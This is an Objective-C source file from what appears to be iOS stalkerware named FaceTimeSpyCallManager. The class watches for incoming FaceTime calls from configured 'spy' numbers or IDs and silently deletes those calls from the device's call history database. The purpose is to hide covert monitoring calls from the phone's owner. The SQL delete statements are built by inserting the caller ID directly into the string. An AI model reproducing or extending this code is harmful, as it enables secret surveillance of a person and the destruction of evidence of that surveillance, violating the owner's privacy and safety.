//
//  RecentFaceTimeCallNotifier.m
//  FaceTimeSpyCallManager
//
//  Created by Makara Khloth on 7/15/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "RecentFaceTimeCallNotifier.h"

#import "Telephony.h"
#import "TelephonyNotificationManager.h"
#import "TelephoneNumber.h"
#import "PreferenceManager.h"
#import "PrefMonitorFacetimeID.h"
#import "FMDatabase.h"
#import "DefStd.h"

#import "CTCall.h"

#import <UIKit/UIKit.h>

@interface RecentFaceTimeCallNotifier (private)
- (void) recentCallAdded: (NSNotification *) aNotification;
- (void) alternativeCallStatusChanged: (NSNotification *) aNotification;
- (BOOL) isFaceTimeCall: (CTCall *) aCall;
- (BOOL) isFTSpyCall: (CTCall *) aCall;
- (NSString *) telephoneNumberFromCall: (CTCall *) aCall;
- (BOOL) isFTSpyNumber: (NSString *) aTelephoneNumber;
@end

@implementation RecentFaceTimeCallNotifier

@synthesize mTelephonyNotificationManager, mPreferenceManager;

- (id) initWithTelephonyNotificationManager: (id <TelephonyNotificationManager>) aTelephonyNotificationManager {
	if ((self = [super init])) {
		[self setMTelephonyNotificationManager:aTelephonyNotificationManager];
	}
	return (self);
}

- (void) start {
    DLog(@">> start RecentFaceTimeCallNotifier")
    // Below iOS 8
	[mTelephonyNotificationManager addNotificationListener:self withSelector:@selector(recentCallAdded:)
										   forNotification:KCALLHISTORYRECORDADDNOTIFICATION];
    // iOS 8
    if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
        [mTelephonyNotificationManager addNotificationListener:self withSelector:@selector(alternativeCallStatusChanged:)
                                               forNotification:KCALLALTERNATESTATUSCHANGENOTIFICATION];
    }
}

- (void) stop {
     DLog(@">> stop RecentFaceTimeCallNotifier")
    // Below iOS 8
	[mTelephonyNotificationManager removeListner:self withName:KCALLHISTORYRECORDADDNOTIFICATION];
    // iOS 8
     if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
         [mTelephonyNotificationManager removeListner:self withName:KCALLALTERNATESTATUSCHANGENOTIFICATION];
     }
}

- (void) recentCallAdded: (NSNotification *) aNotification {
	DLog (@"recentCallAdded >>>>>> %@", aNotification);
	NSNotification *notification = aNotification;
	NSDictionary *userInfo = [notification userInfo];
	CTCall *call = (CTCall *)[userInfo objectForKey:@"kCTCall"];
	if ([self isFTSpyCall:call]) {
		NSString *sql   = nil;
		FMDatabase *db  = nil;
        
        NSString *ftID  = [self telephoneNumberFromCall:call];
        
        if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
            db = [FMDatabase databaseWithPath:kCallHistoryDatabasePathiOS8];
            sql = [NSString stringWithFormat:@"DELETE FROM ZCALLRECORD WHERE ZADDRESS = '%@'", ftID];
        } else {
            db = [FMDatabase databaseWithPath:kCallHistoryDatabasePath];
            sql = [NSString stringWithFormat:@"DELETE FROM call WHERE address = '%@'", ftID];
        }
        
		[db open];
		[db executeUpdate:sql];
		DLog (@"lastErrorCode = %d, lastErrorMessage = %@", [db lastErrorCode], [db lastErrorMessage]);
		[db close];
	}
}

- (void) alternativeCallStatusChanged: (NSNotification *) aNotification {
    DLog (@"alternativeCallStatusChanged >>>>>> %@", aNotification);
    NSNotification *notification = aNotification;
	NSDictionary *userInfo = [notification userInfo];
	NSInteger status = [[userInfo objectForKey:@"kCTCallStatus"] intValue];
	if (status == CALL_NOTIFICATION_STATUS_TERMINATED) {
        [self recentCallAdded:aNotification];
    }
}

// This is to check if it is FaceTime call or Phone call
- (BOOL) isFaceTimeCall: (CTCall *) aCall {
    BOOL isFaceTimeCall     = NO;
    CTCallType callType     = kCTCallTypeNormal;
    callType                = (CTCallType)CTCallGetCallType(aCall);			// Get Call type
    DLog (@"--> callType %@", callType)
    isFaceTimeCall          = [(NSString *) callType isEqualToString:(NSString *) kCTCallTypeVideoConference]       ||
    [(NSString *) callType isEqualToString:(NSString *) @"kCTCallTypeAudioConference"];
    return isFaceTimeCall;
}

- (BOOL) isFTSpyCall: (CTCall *) aCall {
	return (!CTCallIsOutgoing(aCall)		&&                              // Not outgoing
            [self isFaceTimeCall:aCall]     &&                              // It is FaceTime call, not Phone all
			[self isFTSpyNumber:[self telephoneNumberFromCall:aCall]]);     // It is FaceTime number
}

- (NSString *) telephoneNumberFromCall: (CTCall *) aCall {
	NSString *telephoneNumber = CTCallCopyAddress(nil, aCall);
	[telephoneNumber autorelease];
	return (telephoneNumber);
}

- (BOOL) isFTSpyNumber: (NSString *) aFaceTimeID {
	BOOL yes = NO;
	PrefMonitorFacetimeID *prefMonitorFaceTimeIDs = (PrefMonitorFacetimeID *)[[self mPreferenceManager] preference:kFacetimeID];
	if ([prefMonitorFaceTimeIDs mEnableMonitorFacetimeID]) {
		TelephoneNumber *telNumber = [[TelephoneNumber alloc] init];
		for (NSString *ftID in [prefMonitorFaceTimeIDs mMonitorFacetimeIDs]) {
			NSRange locationOfAt = [ftID rangeOfString:@"@"];
			if (locationOfAt.location != NSNotFound) {
				NSString *normalizedFTID = [ftID lowercaseString];
				NSString *normalizedFaceTimeID = [aFaceTimeID lowercaseString];
				if ([normalizedFTID isEqualToString:normalizedFaceTimeID]) {
					yes = YES;
					break;
				}
			} else {
				if ([telNumber isNumber:aFaceTimeID matchWithMonitorNumber:ftID]) {
					yes = YES;
					break;
				}
			}
		}
		[telNumber release];
	}
	DLog(@"isFTSpyNumber %@, %d >>>>>>", aFaceTimeID, yes);
	return (yes);
}

- (void) dealloc {
	[self stop];
	[super dealloc];
}

@end
